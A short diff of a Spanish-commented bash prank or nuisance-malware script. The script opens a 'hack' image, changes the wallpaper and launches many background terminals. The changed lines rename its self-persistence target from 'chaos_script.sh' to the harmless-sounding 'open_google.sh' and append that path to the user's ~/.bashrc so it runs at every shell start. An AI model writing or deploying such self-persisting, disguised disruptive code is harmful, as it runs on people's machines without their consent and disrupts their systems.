@@ -17,9 +17,9 @@ xdg-open "${HACK_IMAGE}"
 # Esto intenta persistir el script en la configuración del usuario
 echo "$(pwd)/open_google.sh" >> ~/.bashrc
 
-# Si el script 'chaos_script.sh' no está en .bashrc, lo añade para persistencia
-if ! grep -q "$(pwd)/chaos_script.sh" ~/.bashrc; then
-    echo "$(pwd)/chaos_script.sh" >> ~/.bashrc
+# Si el script 'open_google.sh' no está en .bashrc, lo añade para persistencia
+if ! grep -q "$(pwd)/open_google.sh" ~/.bashrc; then
+    echo "$(pwd)/open_google.sh" >> ~/.bashrc
 fi
 
 # Captura la hora actual en formato HHMM
@@ -68,7 +68,7 @@ change_wallpaper() {
 }
 
 # Lanza múltiples terminales en segundo plano
-for ((i = 1; i <= NUM_TERMINALES; i++)); do
+for ((i = 2; i <= NUM_TERMINALES; i++)); do
   launch_terminal &
 done
 
